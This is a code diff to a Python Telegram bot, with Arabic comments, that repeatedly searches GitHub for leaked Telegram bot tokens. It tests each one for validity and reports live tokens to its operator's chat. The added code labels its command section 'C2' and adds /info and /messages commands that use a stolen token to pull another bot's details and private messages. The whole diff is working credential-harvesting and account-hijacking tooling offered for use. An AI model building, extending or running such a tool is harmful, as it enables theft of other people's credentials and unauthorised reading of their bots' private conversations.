@@ -4,6 +4,7 @@ import threading
 import time
 import telebot
 from scanner import search_for_tokens
+from controller import get_bot_info, get_bot_messages
 
 GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
 BOT_TOKEN = os.getenv('REPORT_BOT_TOKEN')
@@ -12,7 +13,7 @@ FOUND_FILE = "found.txt"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# دالة الاستماع لأوامر التليجرام
+# --- نظام التحكم (C2) ---
 @bot.message_handler(commands=['get_tokens'])
 def send_tokens(message):
     if str(message.chat.id) == CHAT_ID:
@@ -20,8 +21,23 @@ def send_tokens(message):
             with open(FOUND_FILE, "rb") as f:
                 bot.send_document(message.chat.id, f)
         else:
-            bot.reply_to(message, "⚠️ ملف التوكنات فارغ أو غير موجود.")
+            bot.reply_to(message, "⚠️ الملف فارغ.")
 
+@bot.message_handler(commands=['info'])
+def cmd_info(message):
+    if str(message.chat.id) == CHAT_ID:
+        token = message.text.split()[1] if len(message.text.split()) > 1 else None
+        if token:
+            bot.reply_to(message, f"📋 Info:\n{get_bot_info(token)}")
+
+@bot.message_handler(commands=['messages'])
+def cmd_messages(message):
+    if str(message.chat.id) == CHAT_ID:
+        token = message.text.split()[1] if len(message.text.split()) > 1 else None
+        if token:
+            bot.reply_to(message, f"📩 Messages:\n{get_bot_messages(token)}")
+
+# --- نظام المسح (Scanner) ---
 def is_already_found(token):
     if not os.path.exists(FOUND_FILE): return False
     with open(FOUND_FILE, "r") as f:
@@ -36,12 +52,12 @@ def process_token(token):
     try:
         if requests.get(check_url, timeout=5).status_code == 200:
             if not is_already_found(token):
-                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                requests.post(url, data={"chat_id": CHAT_ID, "text": f"✅ توكن فعال جديد:\n`{token}`", "parse_mode": "Markdown"})
+                bot.send_message(CHAT_ID, f"✅ توكن فعال:\n`{token}`", parse_mode="Markdown")
                 mark_as_found(token)
     except: pass
 
 def run_scanner():
+    print("Zero Engine: Scanner Active...")
     while True:
         tokens = search_for_tokens(GITHUB_TOKEN)
         for token in tokens:
@@ -49,7 +65,5 @@ def run_scanner():
         time.sleep(60)
 
 if __name__ == "__main__":
-    # تشغيل البوت في خيط منفصل للاستماع للأوامر
     threading.Thread(target=bot.infinity_polling).start()
-    # تشغيل الماسح
     run_scanner()
